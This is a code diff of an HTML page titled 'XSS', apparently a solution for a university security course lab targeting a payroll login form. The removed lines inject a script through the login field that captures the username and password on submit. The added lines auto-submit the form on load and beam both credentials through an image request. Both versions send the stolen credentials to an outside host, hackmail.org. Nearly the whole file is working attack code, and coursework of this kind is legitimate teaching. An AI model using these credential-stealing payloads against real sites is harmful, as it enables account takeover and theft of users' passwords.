@@ -6,16 +6,23 @@
     <title>XSS</title>
 </head>
 
-<body onload="document.forms[0].submit()">
-
+<body onload="toDo()">
+    <!--https://www.doyler.net/security-not-included/xss-password-stealing-->
     <form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
-        <input type="hidden" name="RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA"
-            value="RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA">
-        <input type='text' name='login'
-            value='"/><script>function myFunction(){return $.ajax({type: "GET", url: "http://hackmail.org/sendmail.php?" + "&RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA=RGF0YWJhc2VIYWNrc01ha2VUYXJnZXQzRmFsbDIwMjA" + "&username=RmFsbDIwMjBUYXJnZXQyLUdyYWJ0aGVQYXNzd29yZA" + "&payload=" + document.getElementsByName("login")[0].value + " " + document.getElementsByName("pw")[0].value + "&random=" + Math.random(), async: false});}; document.forms[0].setAttribute("onsubmit", "myFunction();");</script> <br class="' />
+        <input type="text" name="login" value="">
+        <input type="password" name="pw">
+        <input type="hidden" name="action" value="login" />
+
     </form>
     <script>
+        function toDo(){
+            document.forms[0].submit();
+            var user = document.getElementsByName('login')[0].value;
+            var pass = document.getElementsByName('pw')[0].value;
+            new Image().src = "http://hackmail.org/sendmail.php?&username=RmFsbDIwMjBUYXJnZXQyLUdyYWJ0aGVQYXNzd29yZA" + "&payload=" + user + " " + pass + "&random=" + Math.random();
+        }
     </script>
+
 </body>
 
 </html>
